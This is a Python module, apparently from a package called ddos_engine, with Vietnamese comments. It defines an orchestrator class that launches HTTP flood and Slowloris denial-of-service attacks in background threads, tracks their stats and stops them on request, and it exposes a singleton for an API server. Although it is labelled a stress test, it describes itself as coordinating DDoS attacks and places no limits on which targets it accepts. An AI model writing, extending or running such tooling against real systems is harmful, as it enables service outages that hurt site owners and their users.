#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDoS Stress Test Orchestrator
Điều phối nhiều loại tấn công và tổng hợp kết quả.
"""

import asyncio
import threading
import time
import logging
from typing import Optional, Callable
from ddos_engine.http_flood import HTTPFlood
from ddos_engine.slowloris import SlowlorisAttack

logger = logging.getLogger('ddos.stress_test')


class AttackOrchestrator:
    """
    Điều phối tấn công DDoS đa dạng.
    Hỗ trợ chạy và dừng tấn công theo yêu cầu từ API.
    """

    def __init__(self):
        self._active_attack = None
        self._attack_thread = None
        self._attack_task = None
        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self._stats: dict = {}
        self._running = False
        self._attack_type = None
        self._lock = threading.Lock()

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def current_stats(self) -> dict:
        return {**self._stats, 'running': self._running, 'type': self._attack_type}

    def start_http_flood(
        self,
        target_url: str,
        method: str = 'GET',
        workers: int = 50,
        duration: int = 30,
        rate_limit: Optional[int] = None,
        stats_callback: Optional[Callable] = None,
    ) -> bool:
        """Bắt đầu HTTP Flood attack trong background thread."""
        if self._running:
            return False

        def _run():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            self._loop = loop

            async def _cb(stats):
                with self._lock:
                    self._stats = stats
                if stats_callback:
                    stats_callback(stats)

            engine = HTTPFlood(
                target_url=target_url,
                method=method,
                num_workers=workers,
                duration=duration,
                rate_limit=rate_limit,
                stats_callback=_cb,
            )
            self._active_attack = engine
            self._running = True
            self._attack_type = f'HTTP {method} Flood'
            self._stats = {}

            try:
                result = loop.run_until_complete(engine.run())
                with self._lock:
                    self._stats = result
            finally:
                self._running = False
                loop.close()

        self._attack_thread = threading.Thread(target=_run, daemon=True)
        self._attack_thread.start()
        return True

    def start_slowloris(
        self,
        host: str,
        port: int = 8080,
        num_sockets: int = 200,
        duration: int = 30,
        sleep_between: float = 10.0,
        stats_callback: Optional[Callable] = None,
    ) -> bool:
        """Bắt đầu Slowloris attack trong background thread."""
        if self._running:
            return False

        def _cb(stats):
            with self._lock:
                self._stats = stats
            if stats_callback:
                stats_callback(stats)

        engine = SlowlorisAttack(
            host=host,
            port=port,
            num_sockets=num_sockets,
            duration=duration,
            sleep_between_headers=sleep_between,
            stats_callback=_cb,
        )
        self._active_attack = engine
        self._running = True
        self._attack_type = 'Slowloris'
        self._stats = {}

        def _run():
            try:
                result = engine.run()
                with self._lock:
                    self._stats = result
            finally:
                self._running = False

        self._attack_thread = threading.Thread(target=_run, daemon=True)
        self._attack_thread.start()
        return True

    def stop(self) -> dict:
        """Dừng bất kỳ attack đang chạy."""
        if not self._running:
            return {'stopped': False, 'reason': 'No attack running'}

        if self._active_attack:
            if hasattr(self._active_attack, 'stop'):
                if asyncio.iscoroutinefunction(self._active_attack.stop):
                    # HTTPFlood stop là async
                    if self._loop and not self._loop.is_closed():
                        asyncio.run_coroutine_threadsafe(self._active_attack.stop(), self._loop)
                else:
                    self._active_attack.stop()

        self._running = False
        return {'stopped': True, 'final_stats': self._stats}

    def get_stats(self) -> dict:
        with self._lock:
            return {
                'running': self._running,
                'type': self._attack_type,
                'stats': dict(self._stats),
            }


# Singleton instance dùng cho API server
_orchestrator = AttackOrchestrator()


def get_orchestrator() -> AttackOrchestrator:
    return _orchestrator
